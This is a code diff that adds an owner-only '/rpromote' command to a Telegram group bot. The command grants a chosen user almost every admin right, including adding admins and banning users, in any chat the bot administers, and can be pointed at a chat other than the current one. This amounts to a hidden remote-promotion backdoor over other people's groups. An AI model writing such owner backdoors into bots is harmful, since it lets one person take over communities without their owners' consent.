@@ -322,3 +322,35 @@ async def bot(event):
     ):
         final += f"\n- @{user.username}"
     await event.reply(final)
+
+
+@Cbot(pattern="^/rpromote ?(.*)")
+async def kek (event):
+ if not event.sender_id == OWNER_ID:
+    return
+ user = None
+ try:
+  user, chat = await get_user(event)
+ except TypeError:
+   pass
+ if not user:
+   return
+ user_id = user.id
+ chat = await tbot.get_entity(chat)
+ chat_id = chat.id
+ try:
+            await tbot.edit_admin(
+                chat_id,
+                int(user_id),
+                manage_call=True,
+                add_admins=True,
+                pin_messages=True,
+                delete_messages=True,
+                ban_users=True,
+                change_info=True,
+                invite_users=True,
+                title="Admin",
+            )
+            text = f"Promoted **{user.first_name}** in **{chat.title}**"
+ except:
+            text = "Seems like I don't have enough rights to do that."
